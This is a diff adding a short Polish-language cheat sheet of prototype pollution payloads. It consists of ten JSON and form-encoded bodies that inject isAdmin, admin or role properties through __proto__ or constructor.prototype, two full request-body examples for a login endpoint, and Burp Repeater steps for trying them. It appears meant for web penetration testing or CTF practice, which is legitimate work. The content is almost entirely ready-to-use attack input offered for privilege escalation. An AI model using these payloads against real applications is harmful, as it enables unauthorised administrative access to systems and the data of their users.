@@ -1,0 +1,49 @@
+# === PROTOTYPE POLLUTION — szybkie payloady ===
+
+# 1. JSON body — __proto__ jako obiekt
+{"__proto__":{"isAdmin":true}}
+
+# 2. JSON — gdy podatne merge jest wewnątrz "login"
+{"login":{"__proto__":{"isAdmin":true}},"password":"test"}
+
+# 3. JSON — alternatywna właściwość
+{"__proto__":{"admin":true}}
+
+# 4. JSON — role
+{"__proto__":{"role":"admin"}}
+
+# 5. JSON — constructor.prototype
+{"constructor":{"prototype":{"isAdmin":true}}}
+
+# 6. form-urlencoded / query parser — bracket notation
+__proto__[isAdmin]=true
+
+# 7. Z prefiksem login
+login[__proto__][isAdmin]=true
+
+# 8. constructor.prototype przez parametry
+constructor[prototype][isAdmin]=true
+
+# 9. Dot notation — jeśli parser ją obsługuje
+__proto__.isAdmin=true
+
+# 10. Dot notation przez login
+login.__proto__.isAdmin=true
+
+
+# === Przykład całego BODY ===
+
+# Content-Type: application/json
+{"login":{"__proto__":{"isAdmin":true}},"password":"test"}
+
+# LUB Content-Type: application/x-www-form-urlencoded
+login[__proto__][isAdmin]=true&password=test
+
+
+# === Co testujesz ===
+# __proto__              -> specjalny mechanizm prototypu w JS
+# constructor.prototype  -> alternatywna droga do prototype
+# isAdmin/admin/role     -> przykładowe właściwości; właściwa nazwa zależy od aplikacji
+#
+# Najwygodniej: przechwyć POST w Burp -> Send to Repeater ->
+# modyfikuj BODY -> Send -> obserwuj odpowiedź/zachowanie aplikacji.
